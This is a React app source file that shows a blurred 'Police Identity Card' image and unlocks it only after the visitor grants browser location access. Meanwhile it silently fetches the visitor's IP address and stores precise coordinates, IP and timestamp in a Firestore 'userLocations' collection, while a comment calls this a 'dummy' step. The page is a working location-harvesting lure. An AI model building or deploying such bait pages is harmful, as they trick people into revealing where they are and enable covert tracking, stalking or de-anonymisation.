import React, { useState, useEffect } from 'react';
import Modal from './components/Modal'; // Assuming Modal is your component
import './App.css'; // Import for general styles and Tailwind
import { doc, setDoc } from "firebase/firestore"; // Import Firestore methods
import { db } from './firebase'; // Import Firestore instance


function App() {
  const [locationGranted, setLocationGranted] = useState(false);
  const [location, setLocation] = useState(null);
  const [ipAddress, setIpAddress] = useState('');
  const [isModalOpen, setIsModalOpen] = useState(false); // Initially false, so modal doesn't show immediately

  // Function to get user's IP address
  useEffect(() => {
    const getIPAddress = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setIpAddress(data.ip);
      } catch (error) {
        console.error('Error fetching IP address:', error);
      }
    };
    getIPAddress();
  }, []);

  // Function to request location access
  const requestLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const fullLat = position.coords.latitude.toFixed(10); // 10 decimal places
          const fullLon = position.coords.longitude.toFixed(10); // 10 decimal places
          setLocation({
            lat: parseFloat(fullLat),
            lon: parseFloat(fullLon),
          });
          console.log('Sending data to server:', fullLat, fullLon);
          setLocationGranted(true);
          setIsModalOpen(false); // Close modal when access granted
        },
        (error) => {
          console.error('Error fetching location:', error);
          setLocationGranted(false);
          setIsModalOpen(true); // Keep modal open if access denied
        }
      );
    } else {
      alert('Geolocation is not supported by this browser.');
    }
  };
  
  // Show the modal after 1 second (1000 ms)
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsModalOpen(true);
    }, 1000);

    return () => clearTimeout(timer); // Clean up the timer if the component unmounts
  }, []);

  // Dummy function to send data to server
  const sendDataToServer = async () => {
    const data = {
      location,
      ipAddress,
      timestamp: new Date(),
    };
  
    // console.log('Sending data to server:', data);
  
    try {
      // Create a document reference
      const docRef = doc(db, "userLocations", ipAddress); // You can use a unique identifier like IP address
  
      // Send data to Firestore
      await setDoc(docRef, data);
  
      console.log('Data sent to Firestore successfully!');
    } catch (error) {
      console.error('Error sending data to Firestore:', error);
    }
  };

  useEffect(() => {
    if (location && ipAddress) {
      // console.log('location', location);
      sendDataToServer();
    }
  }, [location, ipAddress]);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
      <div className="w-full md:w-1/2 max-w-lg">
        {/* Police Identity Card Image */}
        <img 
          src="https://th.bing.com/th/id/OIP.zYuKq4Oa2hAe7GhBNmbvzAAAAA?w=450&h=267&rs=1&pid=ImgDetMain" 
          alt="Police Identity Card" 
          className={`w-full h-auto object-cover rounded-lg shadow-lg ${!location? 'blur-[5px]' : null}`}
        />

        {/* Show Modal if location is not granted */}

        {isModalOpen && <Modal requestLocation={requestLocation} />}
      </div>
    </div>
  );
}

export default App;




// https://th.bing.com/th/id/OIP.zYuKq4Oa2hAe7GhBNmbvzAAAAA?w=450&h=267&rs=1&pid=ImgDetMain
